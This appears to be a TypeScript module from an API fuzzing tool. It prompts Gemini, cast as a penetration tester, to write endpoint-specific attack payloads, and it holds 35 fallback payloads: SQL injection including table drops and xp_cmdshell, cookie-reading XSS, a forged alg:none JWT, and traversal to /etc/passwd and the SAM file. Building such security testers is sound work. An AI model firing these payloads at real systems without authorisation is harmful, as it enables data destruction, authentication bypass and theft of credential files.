// =============================================================================
// AI Payload Generation Service — Gemini 2.5 Flash (Live Integration)
// =============================================================================
//
// Uses @google/genai SDK with the gemini-2.5-flash model.
// System prompt instructs the model to act as a Senior Penetration Tester.
// Returns strictly typed MaliciousPayload[] JSON.
// Falls back to 35 built-in payloads on any failure.
// =============================================================================

import { GoogleGenAI } from "@google/genai";
import type { ParsedEndpoint } from "./openapi-parser.js";
import {
    aiPayloadArraySchema,
    type GeneratedPayload,
} from "../validators/schemas.js";

// ---------------------------------------------------------------------------
// Gemini Client (Singleton)
// ---------------------------------------------------------------------------

const GEMINI_API_KEY = process.env.GEMINI_API_KEY;

let ai: GoogleGenAI | null = null;

function getGeminiClient(): GoogleGenAI | null {
    if (!GEMINI_API_KEY || GEMINI_API_KEY === "your-gemini-api-key-here") {
        return null;
    }
    if (!ai) {
        ai = new GoogleGenAI({ apiKey: GEMINI_API_KEY });
        console.log("[AI] Gemini client initialized");
    }
    return ai;
}

// ---------------------------------------------------------------------------
// System Prompt — Senior Penetration Tester Persona
// ---------------------------------------------------------------------------

const SYSTEM_PROMPT = `You are a Senior Penetration Tester and Application Security Engineer with 15+ years of experience in OWASP Top 10 testing, API fuzzing, and vulnerability research.

Your role is to analyze OpenAPI/Swagger specifications and produce highly sophisticated, context-aware malicious payloads designed to expose real-world vulnerabilities in production APIs.

Rules:
- You MUST return ONLY a valid JSON array. No markdown. No explanations. No text outside the array.
- Every payload must be specifically tailored to the endpoint schema provided.
- Payloads must cover: SQL Injection (including blind, UNION, time-based), NoSQL Injection, XSS (reflected, stored, DOM), Broken Authentication (forged JWTs, missing auth headers, privilege escalation), Massive Integer Overflows, Path Traversal, Server-Side Request Forgery (SSRF), Type Confusion, Oversized Payloads, and Rate Limit Abuse.
- Be creative and sophisticated. DO NOT use trivial or obvious payloads. Think like an attacker who has deep knowledge of the target.`;

// ---------------------------------------------------------------------------
// generateAIResponse — Core LLM Call
// ---------------------------------------------------------------------------

/**
 * Sends the parsed OpenAPI spec context to Gemini 2.5 Flash and returns
 * the raw JSON string of malicious payloads.
 *
 * If no API key is set, or the call fails, returns the fallback payloads.
 */
export async function generateAIResponse(
    endpointSpec: string,
): Promise<string> {
    const client = getGeminiClient();

    if (!client) {
        console.log(
            "[AI] No GEMINI_API_KEY configured — using fallback payloads",
        );
        return JSON.stringify(FALLBACK_PAYLOADS);
    }

    try {
        console.log(
            `[AI] Sending to Gemini 2.5 Flash (${endpointSpec.length} chars)...`,
        );

        const response = await client.models.generateContent({
            model: "gemini-2.5-flash",
            contents: endpointSpec,
            config: {
                systemInstruction: SYSTEM_PROMPT,
                temperature: 0.9,
                maxOutputTokens: 8192,
                responseMimeType: "application/json",
            },
        });

        const text = response.text ?? "";

        if (!text) {
            console.warn(
                "[AI] Gemini returned empty response — using fallback",
            );
            return JSON.stringify(FALLBACK_PAYLOADS);
        }

        console.log(`[AI] Gemini returned ${text.length} chars`);
        return text;
    } catch (err) {
        const message = err instanceof Error ? err.message : String(err);
        console.error("[AI] Gemini API error:", message);

        // Graceful fallback — Onyx attack sequence never crashes
        return JSON.stringify(FALLBACK_PAYLOADS);
    }
}

// ---------------------------------------------------------------------------
// Prompt Builder — Endpoint-Specific Context
// ---------------------------------------------------------------------------

/**
 * Constructs a detailed prompt for a single parsed API endpoint,
 * providing the full schema context for Gemini to generate
 * tailored malicious payloads.
 */
export function buildPayloadPrompt(endpoint: ParsedEndpoint): string {
    const schemaBlock = endpoint.requestBodySchema
        ? `\nRequest Body Schema:\n\`\`\`json\n${JSON.stringify(endpoint.requestBodySchema, null, 2)}\n\`\`\``
        : "\nThis endpoint does not have a documented request body.";

    const paramBlock =
        endpoint.parameters.length > 0
            ? `\nParameters:\n${endpoint.parameters
                  .map(
                      (p) =>
                          `- "${p.name}" (in: ${p.in}, required: ${p.required}${p.schema ? `, schema: ${JSON.stringify(p.schema)}` : ""})`,
                  )
                  .join("\n")}`
            : "";

    return `Analyze the following API endpoint and generate exactly 20 highly sophisticated malicious test payloads.

Target Endpoint: ${endpoint.method} ${endpoint.path}
Operation ID: ${endpoint.operationId ?? "N/A"}
${schemaBlock}
${paramBlock}

Generate 20 payloads covering these attack vectors:
- SQL Injection (classic, blind, UNION-based, time-based, stacked queries)
- NoSQL Injection (MongoDB operator injection, $where, $regex abuse)
- XSS (reflected, stored, DOM-based, polyglot payloads)
- Broken Authentication (missing auth, forged JWT with "alg":"none", IDOR via parameter manipulation)
- Massive Integer Overflows (Number.MAX_SAFE_INTEGER+1, negative overflow, BigInt edge cases)
- Path Traversal (../ sequences, URL-encoded, double-encoded, null byte injection)
- SSRF (internal IP targeting, cloud metadata endpoints)
- Type Confusion (wrong types for all schema fields)
- Oversized Payloads (array bombs, deeply nested objects, 10MB strings)
- Rate Limit Abuse (burst markers)

Each object in the JSON array MUST have exactly these fields:
{
  "payload": <string or JSON object — the malicious payload body, query string, or header value>,
  "attackType": <one of: "SQL_INJECTION", "XSS", "BOUNDARY", "MISSING_AUTH", "PATH_TRAVERSAL", "OVERSIZED_PAYLOAD", "TYPE_CONFUSION", "RATE_LIMIT">,
  "description": <string — brief technical explanation of what vulnerability this tests>
}

If the endpoint has a request body schema, the payload field MUST use the schema structure but inject malicious values into each field. If no request body exists, use query parameter strings or header values.

Return ONLY the JSON array now:`;
}

// ---------------------------------------------------------------------------
// generatePayloadsForEndpoint — Main Entry Point
// ---------------------------------------------------------------------------

/**
 * Generates malicious payloads for a given parsed endpoint via Gemini.
 * Validates the LLM response with Zod before returning.
 * Falls back to built-in payloads on any failure.
 */
export async function generatePayloadsForEndpoint(
    endpoint: ParsedEndpoint,
): Promise<GeneratedPayload[]> {
    const prompt = buildPayloadPrompt(endpoint);

    try {
        const rawResponse = await generateAIResponse(prompt);

        // Extract JSON from the response (Gemini with responseMimeType should
        // return clean JSON, but guard against markdown wrapping just in case)
        const jsonString = extractJson(rawResponse);
        const parsed = JSON.parse(jsonString);
        const validated = aiPayloadArraySchema.safeParse(parsed);

        if (validated.success) {
            console.log(
                `[AI] ✓ Generated ${validated.data.length} payloads for ${endpoint.method} ${endpoint.path}`,
            );
            return validated.data;
        }

        console.warn(
            `[AI] ✗ Validation failed for ${endpoint.method} ${endpoint.path}:`,
            validated.error.issues.slice(0, 3),
        );
        return FALLBACK_PAYLOADS;
    } catch (err) {
        console.error(
            `[AI] ✗ Payload generation failed for ${endpoint.method} ${endpoint.path}:`,
            err instanceof Error ? err.message : err,
        );
        return FALLBACK_PAYLOADS;
    }
}

// ---------------------------------------------------------------------------
// Helpers
// ---------------------------------------------------------------------------

/** Extract JSON array from text that might be wrapped in markdown fences. */
function extractJson(text: string): string {
    // Markdown code block
    const codeBlockMatch = text.match(/```(?:json)?\s*\n?([\s\S]*?)\n?```/);
    if (codeBlockMatch) {
        return codeBlockMatch[1]!.trim();
    }

    // Raw JSON array
    const arrayMatch = text.match(/\[[\s\S]*\]/);
    if (arrayMatch) {
        return arrayMatch[0];
    }

    return text.trim();
}

// ---------------------------------------------------------------------------
// Fallback Payloads — 35 Built-in (used when Gemini is unavailable)
// ---------------------------------------------------------------------------

const FALLBACK_PAYLOADS: GeneratedPayload[] = [
    // ── SQL Injection ─────────────────────────────────────────────
    {
        payload: "' OR 1=1; --",
        attackType: "SQL_INJECTION",
        description: "Classic OR-based SQL injection",
    },
    {
        payload: "'; DROP TABLE users; --",
        attackType: "SQL_INJECTION",
        description: "Destructive table-drop injection",
    },
    {
        payload: "' UNION SELECT NULL,NULL,NULL--",
        attackType: "SQL_INJECTION",
        description: "UNION-based column enumeration",
    },
    {
        payload: "1' AND SLEEP(5)--",
        attackType: "SQL_INJECTION",
        description: "Time-based blind SQLi",
    },
    {
        payload: "admin'--",
        attackType: "SQL_INJECTION",
        description: "Authentication bypass SQLi",
    },
    {
        payload: "1; EXEC xp_cmdshell('whoami')",
        attackType: "SQL_INJECTION",
        description: "OS command execution via SQLi",
    },
    {
        payload: "' OR '1'='1' /*",
        attackType: "SQL_INJECTION",
        description: "Comment-based SQLi with always-true condition",
    },

    // ── XSS ───────────────────────────────────────────────────────
    {
        payload: "<script>alert('XSS')</script>",
        attackType: "XSS",
        description: "Basic reflected XSS",
    },
    {
        payload: "<img src=x onerror=alert(1)>",
        attackType: "XSS",
        description: "Image onerror handler XSS",
    },
    {
        payload: "javascript:alert(document.cookie)",
        attackType: "XSS",
        description: "JavaScript protocol URI XSS",
    },
    {
        payload: "<svg/onload=alert('XSS')>",
        attackType: "XSS",
        description: "SVG onload event XSS",
    },
    {
        payload: "'\"><script>alert(1)</script>",
        attackType: "XSS",
        description: "Context-escaping XSS",
    },
    {
        payload: "<body onload=alert(1)>",
        attackType: "XSS",
        description: "Body onload event XSS",
    },

    // ── Boundary Testing ──────────────────────────────────────────
    { payload: "", attackType: "BOUNDARY", description: "Empty string input" },
    {
        payload: "a".repeat(100000),
        attackType: "BOUNDARY",
        description: "Very long string (100k chars) — buffer overflow test",
    },
    {
        payload: String.fromCharCode(0),
        attackType: "BOUNDARY",
        description: "Null byte injection",
    },
    { payload: "-1", attackType: "BOUNDARY", description: "Negative integer" },
    {
        payload: "99999999999999999999",
        attackType: "BOUNDARY",
        description: "Integer overflow beyond MAX_SAFE_INTEGER",
    },
    { payload: "NaN", attackType: "BOUNDARY", description: "NaN string value" },
    {
        payload: "undefined",
        attackType: "BOUNDARY",
        description: "Undefined string value",
    },

    // ── Missing Auth / Privilege Escalation ────────────────────────
    {
        payload: "[No Authorization Header]",
        attackType: "MISSING_AUTH",
        description: "Request with missing auth header",
    },
    {
        payload: '{"role":"admin","is_superuser":true}',
        attackType: "MISSING_AUTH",
        description: "Privilege escalation via forged role field",
    },
    {
        payload: "Bearer invalidtoken123",
        attackType: "MISSING_AUTH",
        description: "Invalid bearer token",
    },
    {
        payload: "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ.",
        attackType: "MISSING_AUTH",
        description: "JWT with none algorithm — signature bypass",
    },

    // ── Path Traversal ────────────────────────────────────────────
    {
        payload: "../../../etc/passwd",
        attackType: "PATH_TRAVERSAL",
        description: "Unix path traversal to /etc/passwd",
    },
    {
        payload: "..\\..\\..\\windows\\system32\\config\\sam",
        attackType: "PATH_TRAVERSAL",
        description: "Windows path traversal to SAM database",
    },
    {
        payload: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        attackType: "PATH_TRAVERSAL",
        description: "URL-encoded path traversal",
    },
    {
        payload: "....//....//....//etc/passwd",
        attackType: "PATH_TRAVERSAL",
        description: "Double-dot bypass traversal",
    },

    // ── Oversized Payloads ────────────────────────────────────────
    {
        payload: JSON.stringify({ data: Array(10000).fill("x") }),
        attackType: "OVERSIZED_PAYLOAD",
        description: "Array bomb — 10k element array",
    },
    {
        payload: JSON.stringify({
            a: { b: { c: { d: { e: { f: { g: "deep" } } } } } },
        }),
        attackType: "OVERSIZED_PAYLOAD",
        description: "Deeply nested JSON object",
    },

    // ── Type Confusion ────────────────────────────────────────────
    {
        payload: '{"id":"not_a_number"}',
        attackType: "TYPE_CONFUSION",
        description: "String where integer expected",
    },
    {
        payload: '{"name":12345}',
        attackType: "TYPE_CONFUSION",
        description: "Number where string expected",
    },
    {
        payload: '{"items":"not_an_array"}',
        attackType: "TYPE_CONFUSION",
        description: "String where array expected",
    },
    {
        payload: '{"active":"yes"}',
        attackType: "TYPE_CONFUSION",
        description: "String where boolean expected",
    },
    {
        payload: "null",
        attackType: "TYPE_CONFUSION",
        description: "Null value in required field",
    },

    // ── Rate Limit ────────────────────────────────────────────────
    {
        payload: "[RATE_LIMIT_TEST]",
        attackType: "RATE_LIMIT",
        description: "Rapid burst test marker",
    },
];
